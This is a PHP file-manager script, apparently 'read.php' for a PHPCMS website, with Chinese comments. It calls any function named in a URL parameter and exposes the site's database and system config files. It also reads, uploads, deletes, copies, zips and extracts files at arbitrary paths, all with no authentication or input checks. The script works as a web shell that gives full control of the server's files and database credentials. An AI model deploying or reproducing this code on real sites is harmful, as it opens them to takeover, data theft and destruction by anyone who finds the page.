<?php
header('content-type:text/html;charset=utf-8');
$a = empty($_GET['a'])?'index':$_GET['a'];
$action = $a();
//首页
function index(){
    echo '读取文件<br/><a href="read.php?a=read&file=db" >database</a><br/>';
    echo '<a href="read.php?a=read&file=system" >system</a><br/>';
    echo '<form action="read.php?a=read" method="post"><input type="text" name="web" /><input type="submit" value="显示config"/>网站名：yczx</form>';
    echo '上传文件【先备份】<br/><form action="read.php?a=upload" method="post" enctype="multipart/form-data"><input type="file" name="file" /><input type="text" name="path" /><input type="submit" value="上传文件"/>目标路径[com/]  ./XXX/</form>';
    echo '<br/><a href="read.php?a=browse">浏览文件</a><br/><br/><br/>';
    echo '<span>复制项目</span><br/>';
    echo '1.清空<form action="read.php?a=clearObj" method="post"><input type="text" name="src" /><input type="submit" value="清空"/></form>';
    echo '2.复制<form action="read.php?a=copyObj" method="post">源：<input type="text" name="src" />目标：<input type="text" name="dst" /><input type="submit" value="复制"/></form>';
    echo '<form action="read.php?a=doDownload" method="post" ><input type="text" name="file" /><input type="submit" value="打包整站"/></form><br/>';  
}

//浏览
function browse() {
    @$src = @$_GET['src'];
    $src = empty($src) ? '.' : $src;
    readNextDir($src);
}

//读取下一级目录
function readNextDir($src = './') {
    if (!file_exists($src)) {
        echo '目录不存在！';
        return FALSE;
    } elseif (is_file($src)) {
        echo '目标路径不是目录！';
        return FALSE;
    }
    $handle = opendir($src);
    $dir = '';
    $file = '';
    while (($item = readdir($handle)) !== FALSE) {
        if ($item != '.' && $item != '..') {
            if (is_file($src . '/' . $item)) {
                $file .= '<a href="read.php?a=read&path=' . $src . '/' . $item . '" >' . $item . '</a>&nbsp;&nbsp;<a href="read.php?a=deletefile&src=' . $src . '/' . $item . '" >删除</a>&nbsp;&nbsp;<a href="read.php?a=downfile&file=' . $src . '/' . $item . '" >下载</a>';
                $file .= '&nbsp;&nbsp;<a href="write.php?a=index&filename=' .$src . '/' . $item.'" target="_blank" >写文件</a>';
                if(strpos($item,'.zip')){
                    $file .= '&nbsp;&nbsp;<a href="read.php?a=get_zip_originalsize&filename=' .$src . '/' . $item.'.&path=' .$src .'/" >解压</a>';
                }
                $file .= '<br />';
            } else {
                $dir .= 'dir:<a href="read.php?a=browse&src=' . $src . '/' . $item . '" >' . $src . '/' . $item . '</a>
                &nbsp;&nbsp;<a href="read.php?a=deletedir&src=' . $src . '/' . $item . '" >删除</a><br />';
            }
        }
    }
    $shorpath = substr($src, 0, strrpos($src, '/'));
    $shorpath = empty($shorpath) ? './' : $shorpath;
    echo '<a href="read.php?a=browse&src=' . $shorpath . '" >向上</a><br />';
    echo '<a href="read.php?a=createDir&src=' . $src . '" >创建文件夹</a><br /><br />';
    echo $dir;
    echo $file;
    echo '<br/><br/><br/>';
    echo '<form action="read.php?a=upload" method="post" enctype="multipart/form-data"><input type="file" name="file" /><input type="hidden" name="path" value="' . $src . '/' . $item . '" /><input type="submit" value="上传到该目录"/></form>';
}

function upload(){
    @$path = $_POST['path'];
    if($_FILES['file']['error'] == 0){
        move_uploaded_file($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']);
    }
}

//创建目录
function createDir(){
    $post = @$_POST;
    $src = @$_GET['src'];
    if($post){
        if(!file_exists($src.'/'.$post['dirName'])) {
            mkdir($src . '/' . $post['dirName'], 0777, true);
        }
        header('location:read.php?a=browse&src='.$src);
    }else{
        echo '<form action="read.php?a=createDir&src='.$src.'" method="post"><input type="text" name="dirName" /><br/><input type="submit" value="创建" /></form>';
    }
}

//删除目录
function deletedir(){
    $delete = @$_GET['delete'];
    $src = @$_GET['src'];
    if($delete){
        deleteAll($src);
        header('location:read.php');
    }else {
        echo '确认删除？<br/>';
        echo '<a href="read.php?a=deletedir&delete=1&src=' . $src . '">确认</a>';
    }
}

function deleteAll($src){
    $handle = opendir($src);
    $item = '';
    while (($item = readdir($handle)) !== FALSE) {
        if ($item != '.' && $item != '..') {
            if (is_file($src . '/' . $item)) {
                unlink($src . '/' . $item);
            } else {
                $function = __FUNCTION__;
                $function($src . '/' . $item);
            }
        }
    }
    closedir ( $handle );
    rmdir($src);
}

//读取
function read() {
    $file = $web = '';
    $config = @$_GET['file']; //读取配置
    $web = @$_POST['web']; //读取指定CMS网站目录配置
    if (!empty($config)) {
        switch ($config) {
            case 'db':$file = './caches/configs/database.php';
                break;
            case 'system':$file = './caches/configs/system.php';
                break;
            default :$file = './phpcms/templates/' . $web . '/config.php';
                break;
        }
    } else {
        $file = $_GET['path']; //自定义读取文件
    }
    if (file_exists($file)) {
        oneWord($file);
    }
}

function deletefile() {
    $src = @$_GET['src'];
    echo '确认删除？<br/>';
    echo '<a href="read.php?a=doDelete&src=' . $src . '">确认</a>';
}

function doDelete() {
    $src = @$_GET['src'];
    if (file_exists($src)) {
        unlink($src);
    }
}

function clearObj(){
    $src = @$_POST['src'];
    delAll($src);
}

function copyObj(){
    $src = @$_POST['src'];
    $dst = @$_POST['dst'];        
    copyDir($src, $dst);
}

function delAll($src) {
    if (!file_exists($src)) {
        return FALSE; //判断文件是否存在
    }
    $handle = opendir($src); //打开文件句柄	
    while (($item = readdir($handle)) !== false) {//读取文件
        if ($item != '.' && $item != '..') {
            if (is_file($src . "/" . $item)) {
                unlink($src . "/" . $item); //删除文件					
            } else {
                delAll($src . "/" . $item);
            }
        }
    }
    closedir($handle); //关闭文件句柄	
    rmdir($src); //删除目录自身
}

function copyDir($src, $dst){        
    if (! file_exists ( $src ) || file_exists ( $dst )) {
            return FALSE;
    }        
    mkdir ( $dst );        
    $handle = opendir ( $src );
    while ( ($item = readdir ( $handle )) !== FALSE ) {
            if ($item != '.' && $item != '..') {
                    if (is_file ( $src . '/' . $item )) {
                            copy ( $src . '/' . $item, $dst . '/' . $item );
                    } else {				
                            copyDir ( $src . '/' . $item, $dst . '/' . $item );
                    }
            }
    }
    closedir ( $handle );
}

function downfile(){
    $fileinfo = @$_GET['file'];
    //执行文件下载
    $file = realpath($fileinfo);
    header("Content-Type: application/force-download");
    header("Content-Disposition: attachment; filename=" . basename($file));
    readfile($file);
}

//打包下载执行
function doDownload(){
    $file = @$_POST['file'];
    $file = empty($file)?'.':$file;
    $zip=new ZipArchive();
    if($zip->open('./test.zip', ZipArchive::OVERWRITE)=== TRUE){
        zipAndDownload($file, $zip); //调用方法，对要打包的根目录进行操作，并将ZipArchive的对象传递给方法
        $zip->close(); //关闭处理的zip文件
    }
}

function zipAndDownload($path,$zip){        
    $handler=opendir($path); //打开当前文件夹由$path指定。
    while(($filename=readdir($handler))!==false){
        if($filename != "." && $filename != ".."){//文件夹文件名字为'.'和‘..’，不要对他们进行操作
            if(is_dir($path."/".$filename)){// 如果读取的某个对象是文件夹，则递归
                zipAndDownload($path."/".$filename, $zip);
            }else{ //将文件加入zip对象
                $zip->addFile($path."/".$filename);
            }
        }
    }
    @closedir($path);
}

//解压缩
function get_zip_originalsize() {
    @$filename = $_GET['filename'];
    @$path = $_GET['path']?$_GET['path']:'./';
    //先判断待解压的文件是否存在
    if(!file_exists($filename)){
        die("文件 $filename 不存在！");
    }
    $starttime = explode(' ',microtime()); //解压开始的时间

    //将文件名和路径转成windows系统默认的gb2312编码，否则将会读取不到
    $filename = iconv("utf-8","gb2312",$filename);
    $path = iconv("utf-8","gb2312",$path);
    //打开压缩包
    $resource = zip_open($filename);
    $i = 1;
    //遍历读取压缩包里面的一个个文件
    while ($dir_resource = zip_read($resource)) {
        //如果能打开则继续
        if (zip_entry_open($resource,$dir_resource)) {
            //获取当前项目的名称,即压缩包里面当前对应的文件名
            $file_name = $path.zip_entry_name($dir_resource);
            //以最后一个“/”分割,再用字符串截取出路径部分
            $file_path = substr($file_name,0,strrpos($file_name, "/"));
            //如果路径不存在，则创建一个目录，true表示可以创建多级目录
            if(!is_dir($file_path)){
                mkdir($file_path,0777,true);
            }
            //如果不是目录，则写入文件
            if(!is_dir($file_name)){
                //读取这个文件
                $file_size = zip_entry_filesize($dir_resource);
                //最大读取6M，如果文件过大，跳过解压，继续下一个
                if($file_size<(1024*1024*6)){
                    $file_content = zip_entry_read($dir_resource,$file_size);
                    file_put_contents($file_name,$file_content);
                }else{
                    echo "<p> ".$i++." 此文件已被跳过，原因：文件过大， -> ".iconv("gb2312","utf-8",$file_name)." </p>";
                }
            }
            //关闭当前
            zip_entry_close($dir_resource);
        }
    }
    //关闭压缩包
    zip_close($resource);
    $endtime = explode(' ',microtime()); //解压结束的时间
    $thistime = $endtime[0]+$endtime[1]-($starttime[0]+$starttime[1]);
    $thistime = round($thistime,3); //保留3为小数
    echo "<p>解压完毕！，本次解压花费：$thistime 秒。</p>";
}

